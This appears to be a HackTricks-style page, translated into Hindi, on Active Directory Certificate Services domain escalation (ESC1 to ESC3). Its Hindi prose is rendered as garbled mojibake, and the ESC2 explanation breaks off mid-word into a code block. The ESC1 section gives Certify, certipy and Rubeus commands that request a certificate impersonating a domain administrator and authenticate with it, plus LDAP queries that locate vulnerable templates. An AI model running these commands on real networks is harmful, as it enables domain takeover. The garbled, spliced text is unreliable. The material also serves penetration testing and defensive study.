# рдПрдбреА рд╕реАрдПрд╕ рдбреЛрдореЗрди рдПрд╕реНрдХрд▓реЗрд╢рди

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

**рдпрд╣ рдкреЛрд╕реНрдЯреЛрдВ рдХрд╛ рд╕рд╛рд░рд╛рдВрд╢ рд╣реИ:**
* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕ - ESC1

### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

### рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕ - ESC1 рдХрд╛ рд╡рд┐рд╡рд░рдг

* **рдЙрдЪреНрдЪ-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЙрджреНрдпрдо CA рджреНрд╡рд╛рд░рд╛ рдирд╛рдорд╛рдВрдХрди рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред**
* **рдореИрдиреЗрдЬрд░ рдХреА рдордВрдЬреВрд░реА рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИред**
* **рдЕрдзрд┐рдХреГрдд рдХрд░реНрдордЪрд╛рд░рд┐рдпреЛрдВ рдХреЗ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИред**
* **рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕ рдкрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╡рд░рдг рдЕрддреНрдпрдзрд┐рдХ рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдЙрдЪреНрдЪ-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдПрдВ рдирд╛рдорд╛рдВрдХрди рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**
* **рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕ рдХреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП EKU рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рддреЗ рд╣реИрдВ:**
* рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдХреБрдВрдЬреА рдЙрдкрдпреЛрдЧ (EKU) рдкрд╣рдЪрд╛рдирдХрд░рдг рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рдиреЗ рд╡рд╛рд▓реЗ рдЕрдВрдХ рдЬреИрд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг (OID 1.3.6.1.5.5.7.3.2), PKINIT рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг (1.3.6.1.5.2.3.4), рд╕реНрдорд╛рд░реНрдЯ рдХрд╛рд░реНрдб рд▓реЙрдЧрдСрди (OID 1.3.6.1.4.1.311.20.2.2), рдХреЛрдИ рдЙрджреНрджреЗрд╢реНрдп (OID 2.5.29.37.0), рдпрд╛ рдХреЛрдИ EKU рдирд╣реАрдВ (SubCA) рд╢рд╛рдорд┐рд▓ рд╣реИрдВред
* **рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рд╕рд╛рдЗрдирд┐рдВрдЧ рдЕрдиреБрд░реЛрдз (CSR) рдореЗрдВ subjectAltName рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдЯреЗрдореНрдкрд▓реЗрдЯ рджреНрд╡рд╛рд░рд╛ рджреА рдЧрдИ рд╣реИ:**
* рдпрджрд┐ рдореМрдЬреВрдж рд╣реИ, рддреЛ рд╕рдХреНрд░рд┐рдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ (AD) рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдореЗрдВ subjectAltName (SAN) рдХреЛ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреЗрддреА рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ CSR рдореЗрдВ SAN рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдХреЗ, рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ (рдЬреИрд╕реЗ рдбреЛрдореЗрди рдкреНрд░рд╢рд╛рд╕рдХ) рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ SAN рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдпрд╣ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЗ AD рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ `mspki-certificate-name-flag` рд╕рдВрдкрддреНрддрд┐ рдореЗрдВ рд╕реВрдЪрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рд╕рдВрдкрддреНрддрд┐ рдПрдХ рдмрд┐рдЯрдорд╛рд╕реНрдХ рд╣реИ, рдФрд░ `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` рдЭрдВрдбрд╛ рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ SAN рдХреА рдирд┐рд░реНрджрд┐рд╖реНрдЯрд┐ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред

{% hint style="danger" %}
рдЙрдкрд░реЛрдХреНрдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдЙрдЪреНрдЪ-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдХрд┐рд╕реА рднреА рдЪрдпрдирд┐рдд SAN рдХреЗ рд╕рд╛рде рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХреЗрд░рдмреЗрд░реЛрд╕ рдпрд╛ рдПрд╕рдЪреИрдирд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рд╕реА рднреА рдбреЛрдореЗрди рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

рдпрд╣ рд╕реБрд╡рд┐рдзрд╛ рдХрднреА-рдХрднреА HTTPS рдпрд╛ рд╣реЛрд╕реНрдЯ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХрд╛ рддрддреНрдХрд╛рд▓ рдЙрддреНрдкрд╛рджрди рдХрд░рдиреЗ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдХреНрд╖рдо рдХреА рдЬрд╛рддреА рд╣реИ, рдЙрддреНрдкрд╛рджреЛрдВ рдпрд╛ рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ рд╕реЗрд╡рд╛рдУрдВ рджреНрд╡рд╛рд░рд╛, рдпрд╛ рд╕рдордЭреМрддреЗ рдХреА рдХрдореА рдХреЗ рдХрд╛рд░рдгред

рдЗрд╕реЗ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рдЗрд╕ рд╡рд┐рдХрд▓реНрдк рдХреЗ рд╕рд╛рде рдПрдХ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдмрдирд╛рдиреЗ рдкрд░ рдЪреЗрддрд╛рд╡рдиреА рджреА рдЬрд╛рддреА рд╣реИ, рдЬреЛ рдРрд╕рд╛ рдорд╛рдорд▓рд╛ рдирд╣реАрдВ рд╣реИ рдЬрдм рдХреЛрдИ рдореМрдЬреВрджрд╛ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯ (рдЬреИрд╕реЗ `WebServer` рдЯреЗрдореНрдкрд▓реЗрдЯ, рдЬрд┐рд╕рдореЗрдВ `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` рд╕рдХреНрд╖рдо рд╣реИ) рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИ рдФрд░ рдлрд┐рд░ рдЙрд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг OID рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

### рджреБрд░реБрдкрдпреЛрдЧ

**рд╡рд┐рдХрд▓реНрдкреА рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕** рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
**рдЗрд╕ рдХрдордЬреЛрд░реА рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рдХреА рднреВрдорд┐рдХрд╛ рдЕрднрд┐рдорд╛рдирд┐рдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
рддрдм рдЖрдк рдЙрддреНрдкрдиреНрди **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ `.pfx`** рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд┐рд░ рд╕реЗ **Rubeus рдпрд╛ certipy рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows рдмрд╛рдЗрдирд░реА "Certreq.exe" рдФрд░ "Certutil.exe" рдХрд╛ рдЙрдкрдпреЛрдЧ PFX рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD рд╡рдиреНрдпрдЬреАрд╡рди рдХреЗ рд╡рд┐рдиреНрдпрд╛рд╕ рд╕реНрдХреАрдорд╛ рдореЗрдВ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рдЬрд╛рдБрдЪ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЙрди рдЯреЗрдореНрдкрд▓реЗрдЯреЛрдВ рдХреА, рдЬрд┐рдиреНрд╣реЗрдВ рдордВрдЬреВрд░реА рдпрд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ, рдЬрд┐рдирдореЗрдВ рдПрдХ рдЧреНрд░рд╛рд╣рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдпрд╛ рд╕реНрдорд╛рд░реНрдЯ рдХрд╛рд░реНрдб рд▓реЙрдЧрдСрди EKU рд╣реИ, рдФрд░ `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` рдзреНрд╡рдЬ рд╕рдХреНрд╖рдо рд╣реИ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд LDAP рдХреНрд╡реЗрд░реА рдЪрд▓рд╛рдХрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕ - ESC2

### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

рджреВрд╕рд░реЗ рджреБрд░реБрдкрдпреЛрдЧ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдкрд╣рд▓реЗ рд╡рд╛рд▓реЗ рдХрд╛ рдПрдХ рд░реВрдк рд╣реИ:

1. рдЙрдЪреНрдЪ-рдЕрдзрд┐рдХрд╛рд░рд┐рддрд╛ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЙрджреНрдпрдо CA рджреНрд╡рд╛рд░рд╛ рдкрдВрдЬреАрдХрд░рдг рдХреЗ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред
2. рдкреНрд░рдмрдВрдзрдХ рд╕реНрд╡реАрдХреГрддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд┐рд╖реЗрдзрд┐рдд рдХреА рдЬрд╛рддреА рд╣реИред
3. рдЕрдзрд┐рдХреГрдд рд╣рд╕реНрддрд╛рдХреНрд╖рд░реЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдЫреВрдЯ рджреА рдЬрд╛рддреА рд╣реИред
4. рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯ рдкрд░ рдЕрддреНрдпрдзрд┐рдХ рдЕрдиреБрдорддрд┐рдкреВрд░реНрдг рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╡рд░рдг рдЙрдЪрд┐рдд рдЕрдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдкрдВрдЬреАрдХрд░рдг рдХреЗ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
5. **рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЛ рдХрд┐рд╕реА рднреА рдЙрджреНрджреЗрд╢реНрдп EKU рдпрд╛ рдХреЛрдИ EKU рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред**

**рдХрд┐рд╕реА рднреА рдЙрджреНрджреЗрд╢реНрдп EKU** рдПрдХ рдЖрдХреНрд░рдордгрдХрд░реНрддрд╛ рдХреЛ **рдХрд┐рд╕реА рднреА рдЙрджреНрджреЗрд╢реНрдп**, рдЬреИрд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг, рд╕рд░реНрд╡рд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг, рдХреЛрдб рд╕рд╛рдЗрдирд┐рдВрдЧ, рдЖрджрд┐ рдХреЗ рд▓рд┐рдП рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрд╕реА **рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ ESC3 рдХреЗ рд▓рд┐рдП** рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**рдХреЛрдИ EKU рд╡рд╛рд▓реЗ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ** рдЬреЛ рдЙрдк-CA рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддреЗ рд╣реИрдВ, **рдХрд┐рд╕реА рднреА рдЙрджреНрджреЗрд╢реНрдп** рдХреЗ рд▓рд┐рдП рд╢реЛрд╖рд┐рдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдирдП рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯреЛрдВ рдХреЛ рд╕рд╛рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЗрд╕рд▓рд┐рдП, рдПрдХ рдЖрдХреНрд░рдордгрдХрд░реНрддрд╛ рдЙрдк-CA рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирдП рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯреЛрдВ рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди EKUs рдпрд╛ рдХреНрд╖реЗрддреНрд░реЛрдВ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, **рдбреЛрдореЗрди рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреЗ рд▓рд┐рдП рдирдП рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реЛрдВрдЧреЗ рдЕрдЧрд░ рдЙрдк-CA рдХреЛ **`NTAuthCertificates`** рдСрдмреНрдЬ
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## рдЧрд▓рдд рд░реВрдк рд╕реЗ рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕ - ESC3

### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

рдпрд╣ рдкрд░рд┐рджреГрд╢реНрдп рдкрд╣рд▓реЗ рдФрд░ рджреВрд╕рд░реЗ рдХреЗ рд╕рдорд╛рди рд╣реИ, рд▓реЗрдХрд┐рди рдПрдХ **рд╡рд┐рднрд┐рдиреНрди EKU** (рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдПрдЬреЗрдВрдЯ) рдХрд╛ **рджреБрд░реБрдкрдпреЛрдЧ** рдХрд░ рд░рд╣рд╛ рд╣реИ рдФрд░ **2 рд╡рд┐рднрд┐рдиреНрди рдЯреЗрдореНрдкрд▓реЗрдЯ** рд╣реИ (рдЗрд╕рд▓рд┐рдП рдЗрд╕рдореЗрдВ 2 рд╕реЗрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ рд╣реИрдВ),

**рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдПрдЬреЗрдВрдЯ EKU** (OID 1.3.6.1.4.1.311.20.2.1), рдЬрд┐рд╕реЗ рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ **рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯ** рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдХрд┐рд╕реА рдкреНрд░рдзрд╛рди рдХреЛ рджреВрд╕рд░реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХреЗ рд▓рд┐рдП **рдПрдирд░реЛрд▓** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

**тАЬрдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯтАЭ** рдРрд╕реЗ рдПрдХ **рдЯреЗрдореНрдкрд▓реЗрдЯ** рдореЗрдВ рдПрдирд░реЛрд▓ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк **рджреВрд╕рд░реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП CSR рдХреЛ рд╕рд╣-рд╕рд╛рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рд╛рдкреНрдд рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ**ред рдлрд┐рд░ рдпрд╣ **рд╕рд╣-рд╕рд╛рдЗрди рдХрд┐рдП рдЧрдП CSR** рдХреЛ рд╕реАрдП рдХреЛ рднреЗрдЬрддрд╛ рд╣реИ, рдЬреЛ рдПрдХ **рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдПрдирд░реЛрд▓ рдХрд░рддрд╛ рд╣реИ рдЬреЛ тАЬрдХрд┐рд╕реА рдХреЗ рд▓рд┐рдП рдПрдирд░реЛрд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИтАЭ**, рдФрд░ рд╕реАрдП рдПрдХ **тАЬрджреВрд╕рд░реЗтАЭ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рджреЗрддрд╛ рд╣реИ**ред

**рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ 1:**

- рдЙрдЪреНрдЪ-рдЕрдзрд┐рдХрд╛рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЙрдЪреНрдЪ-рдЕрдзрд┐рдХрд╛рд░реА рд╕реАрдП рджреНрд╡рд╛рд░рд╛ рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред
